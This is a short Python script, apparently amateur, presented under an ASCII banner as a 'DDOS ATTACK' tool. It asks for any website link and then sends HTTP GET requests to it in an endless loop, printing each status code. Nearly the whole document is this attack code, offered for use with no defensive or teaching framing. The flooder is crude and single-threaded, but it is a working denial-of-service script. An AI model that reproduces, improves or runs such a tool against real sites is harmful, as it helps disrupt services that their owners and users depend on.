
logo = '''
\033[1:37m,--. ,--. ,-----. ,-----.  ,--.,------.     
|  .'   /'  .-.  '|  |) /_ |  ||  .--. '    
|  .   ' |  | |  ||  .-.  \|  ||  '--'.'    
|  |\   \'  '-'  '|  '--' /|  ||  |\  \     
`--' '--' `-----' `------' `--'`--' '--'    
                                            
   * CREDIT SK KOBIR VAI *
    ** DDOS ATTACK TOIL**'''
print(logo)

# DDOS in python
import requests 



target = input("enter website link:")
while True:
  r = requests.get(target)
  print(r.status_code)